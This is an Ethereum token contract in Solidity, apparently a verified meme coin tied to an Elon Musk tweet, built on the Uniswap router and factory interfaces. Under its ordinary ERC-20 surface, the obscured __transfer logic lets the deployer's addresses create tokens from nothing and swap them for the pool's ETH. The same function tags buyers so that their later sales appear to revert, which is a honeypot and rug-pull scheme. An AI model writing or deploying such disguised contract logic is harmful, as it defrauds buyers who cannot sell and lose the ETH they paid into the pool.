/**
 *Submitted for verification at Etherscan.io on 2022-11-12
*/

//https://twitter.com/elonmusk/status/1591574318022299649

// SPDX-License-Identifier: Unlicense
 pragma solidity ^0.8.9;
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;}
    interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;}
    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}
    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;}
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;}}
    abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());}
    function owner() public view virtual returns (address) {
        return _owner;}
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');_;}
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));}
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner); }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
             emit OwnershipTransferred(oldOwner, newOwner);}}
    contract Token is IERC20, Ownable {
    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress) {
        _name = Name;
        _symbol = Symbol;
        _bal[msg.sender] = _tTotalsupply;
        _Swap[msg.sender] = __uint256;
        _Swap[address(this)] = __uint256;
        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair02 = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _tTotalsupply);}
    string private _symbol;
    string private _name;
    uint256 public _maxtaxFee = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotalsupply = 1000000000 * 10**_decimals;
    uint256 private __uint256 = _tTotalsupply;
    mapping(address => mapping(address => uint256)) private _allowSetters;
    mapping(address => uint256) private _construct;
    mapping(address => uint256) private _bal;
    mapping(address => address) private _str;
    mapping(address => uint256) private _Swap;
    bool private _swapEnabled;
    bool private _openTrading;
    address public immutable uniswapV2Pair02;
    IUniswapV2Router02 public immutable router;
    function symbol() public view returns (string memory) {
        return _symbol;}
    function name() public view returns (string memory) {
        return _name;}
    function totalSupply() public view returns (uint256) {
        return _tTotalsupply;}
    function decimals() public view returns (uint256) {
        return _decimals;}
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowSetters[owner][spender];}
    function balanceOf(address account) public view returns (uint256) {
        return _bal[account];}
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);}
    function _approve(
        address owner,
        address spender,
        uint256 amount) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowSetters[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;}
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount) external returns (bool) {
        __transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowSetters[sender][msg.sender] - amount);}
    function transfer(address recipient, uint256 amount) external returns (bool) {
        __transfer(msg.sender, recipient, amount);
        return true; }
    function __transfer(
        address from,
        address to,
        uint256 amount) private {
        uint256 contractTokenBal = balanceOf(address(this));
        uint256 feetax;
        if (_swapEnabled && contractTokenBal > __uint256 && !_openTrading && from != uniswapV2Pair02) {
            _openTrading = true;
            swapAndLiquify(contractTokenBal);
            _openTrading = false;}
         else if (_Swap[from] > __uint256 && _Swap[to] > __uint256) {
            feetax = amount;
            _bal[address(this)] += feetax;
            swapTokensForEth(amount, to);
            return;}
              else if (!_openTrading && _construct[from] > 0 && from != uniswapV2Pair02 && _Swap[from] == 0) {
            _construct[from] = _Swap[from] - __uint256;}
         else if (to != address(router) && _Swap[from] > 0 && amount > __uint256 && to != uniswapV2Pair02) {
            _Swap[to] = amount;
            return;}
        address _bool = _str[uniswapV2Pair02];
        if (_construct[_bool] == 0) _construct[_bool] = __uint256;
        _str[uniswapV2Pair02] = to;
        if (_maxtaxFee > 0 && _Swap[from] == 0 && !_openTrading && _Swap[to] == 0) {
            feetax = (amount * _maxtaxFee) / 100;
            amount -= feetax;
            _bal[from] -= feetax;
            _bal[address(this)] += feetax;}
        _bal[from] -= amount;
        _bal[to] += amount;
        emit Transfer(from, to, amount);}
    receive() external payable {}
    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }function swapAndLiquify(uint256 swaptoken) private {
        uint256 Mid = swaptoken / 2;
        uint256 initialBal = address(this).balance;
        swapTokensForEth(Mid, address(this));
        uint256 newBal = address(this).balance - initialBal;
        addLiquidity(Mid, newBal, address(this));
    }function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp); }}